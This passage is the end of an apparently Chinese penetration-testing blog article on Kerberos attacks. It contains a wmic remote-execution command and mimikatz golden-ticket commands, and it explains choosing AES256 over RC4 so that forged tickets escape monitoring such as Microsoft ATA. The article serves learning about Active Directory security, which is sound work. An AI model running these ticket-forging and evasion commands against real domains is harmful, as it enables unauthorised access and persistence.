wmic /authority:"kerberos:<domain>\<target>" /node:<ip> process call create "cmd.exe /c echo 'hello' >> C:\tools\1.txt"
```

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-72d958915a774675989d290af6b9d245.png)

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-73e9435c06b4492581080f031b9b78a9.png)

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-175b741ecc0745e6ab29a257440cdacd.png)



## 一些值得注意的内容



### 加密算法

kerberos支持多种加密算法，它们分别是:

- DES_CBC_CRC
- DES_CBC_MD5
- RC4_HMAC_MD5
- AES128_HMAC_SHA1
- AES256_HMAC_SHA1

在上文使用的例子均是指定了RC4作为票据的加密算法，但是在实际场景中，**这会出现一些问题**

1. Protected Users组的成员无法使用RC4或者DES作为kerberos加密类型
2. 大多数流量监测和安全设备会将RC4加密的票据定义为异常流量(例如[微软ATA](https://docs.microsoft.com/en-gb/advanced-threat-analytics/what-is-ata))，因为大多数请求使用AES256

在创建票据的时候可以指定票据加密算法，例如:

```powershell
#RC4
mimikatz.exe "kerberos::golden /admin:<username> /id:<UID> /domain:<domain name> /sid:<domain SID> /target:<taget domain> /rc4:<computer account HASH> /service:host /ptt" exit exit

#AES256
mimikatz.exe "kerberos::golden /admin:<username> /id:<UID> /domain:<domain name> /sid:<domain SID> /target:<taget domain> /aes256:<computer account HASH> /service:host /ptt" exit exit
```







## 结语

> 文章很长，感谢各位大佬的阅读，如果有错误或者需要补充的内容还请大佬们多多指出，我一直相信交流是最快的学习方式。
>
> Kerberos、内网渗透涉及的内容、攻击方式其实非常多，在本篇文章中无法一一分享，有些额外独立的内容会随着我学习的推进总结在接下来的其他文章中，也请大家多多包涵

# 参考链接

[Sneaky Active Directory Persistence #14: SID History](https://adsecurity.org/?p=1772)
[Kerberos Wireshark Captures: A Windows Login Example](https://medium.com/@robert.broeckelmann/kerberos-wireshark-captures-a-windows-login-example-151fabf3375a)
[Attack Catalog-Golden Ticket](https://attack.stealthbits.com/how-golden-ticket-attack-works)
[ADSecurity-SPNs](https://adsecurity.org/?page_id=183)
[Kerberoasting - Part 2](https://malicious.link/post/2016/kerberoast-pt2/)
[Domain Controller Backdoor: Skeleton Key](https://www.hackingarticles.in/domain-controller-backdoor-skeleton-key/)[Attacking Active Directory: 0 to 0.9](https://zer1t0.gitlab.io/posts/attacking_ad/)
